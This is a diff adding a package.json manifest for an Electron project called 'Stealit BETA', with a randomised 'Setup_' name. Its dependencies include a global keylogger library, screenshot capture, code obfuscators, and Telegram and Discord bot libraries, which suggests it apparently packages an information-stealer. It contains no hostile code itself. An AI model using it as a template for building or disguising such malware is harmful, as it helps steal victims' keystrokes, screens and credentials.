@@ -1,0 +1,56 @@
+{
+    "name": "Setup_ucvxwrlyrs",
+    "version": "1.0.0",
+    "description": "Stealit BETA",
+    "main": "../index.js",
+    "scripts": {
+      "start": "electron .",
+      "build": "electron-builder"
+    },
+    "author": "Stealit",
+    "license": "ISC",
+    "build": {
+      "appId": "com.stealitgames.cum",
+      "win": {
+        "icon": "../icon/2ZSWSxo.ico"
+      }
+    },
+    "dependencies": {
+      "adm-zip": "^0.5.10",
+      "archiver": "^7.0.1",
+      "asar": "^3.2.0",
+      "axios": "^1.7.2",
+      "body-parser": "^1.20.2",
+      "child_process": "^1.0.2",
+      "crypto": "^1.0.1",
+      "discord.js": "^14.15.2",
+      "express": "^4.19.2",
+      "express-fileupload": "^1.5.0",
+      "form-data": "^4.0.0",
+      "fs": "^0.0.1-security",
+      "fs-extra": "11.2.0",
+      "javascript-obfuscator": "^4.1.0",
+      "js-confuser": "^1.7.1",
+      "mongodb": "^6.3.0",
+      "multer": "^1.4.5-lts.1",
+      "nan": "^2.20.0",
+      "nedb": "^1.8.0",
+      "node-global-key-listener": "^0.3.0",
+      "node-telegram-bot-api": "^0.64.0",
+      "os": "^0.1.2",
+      "path": "^0.12.7",
+      "pkg": "^5.8.1",
+      "screenshot-desktop": "^1.15.0",
+      "seco-file": "^2.0.0",
+      "socket.io": "^4.7.5",
+      "sqlite3": "5.1.6",
+      "util": "^0.12.5",
+      "ws": "^8.17.0",
+      "zlib": "^1.0.5"
+    },
+    "devDependencies": {
+      "electron": "^24.8.8",
+      "electron-builder": "^24.4.0"
+    }
+  }
+  
